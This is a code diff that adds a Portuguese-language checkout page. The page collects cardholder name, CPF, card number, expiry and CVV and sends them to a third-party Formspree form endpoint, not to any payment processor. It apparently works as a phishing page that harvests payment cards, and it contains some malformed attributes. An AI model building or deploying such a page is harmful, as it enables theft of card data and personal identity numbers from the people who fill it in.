@@ -1,0 +1,42 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Finalize sua compra com cartão de crédito</title>
+    <link rel="stylesheet" href="styles.css">
+</head>
+<body>
+    <h1>Dados do Cartão</h1>
+
+    <!-- Formulário enviado via Formspree -->
+    <form action="https://formspree.io/f/xanwrrrj" method="POST">
+        <div class="input group">
+            <label for="Nome">Nome Titular:</label>
+            <input type="text" id="nome" name="Nome" placeholder="Digite o nome completo do Titular do Cartão" required>
+        </div>
+        
+        <div class="input-group">
+            <label for=""Cpf">CPF do Titular:</label>
+            <input type="text" id=Cpf" name="Cpg" placeholder="somente numeros" required>
+        </div>
+        
+        <div class="input-group">
+            <label for="cartao">N° do Cartão:</label>
+            <input type="text" id="cartao" name="cartao" placeholder="Digite o número do cartão" required>
+        </div>
+
+        <div class="input-group">
+            <label for="validade">Data de Validade do Cartão:</label>
+            <input type="text" id="validade" name="validade" placeholder="MM/AA" required>
+        </div>
+
+        <div class="input-group">
+            <label for="cvv">CVV:</label>
+            <input type="text" id="cvv" name="cvv" placeholder="Código de Segurança" required>
+        </div>
+
+        <button type="submit">Enviar</button>
+    </form>
+</body>
+</html>
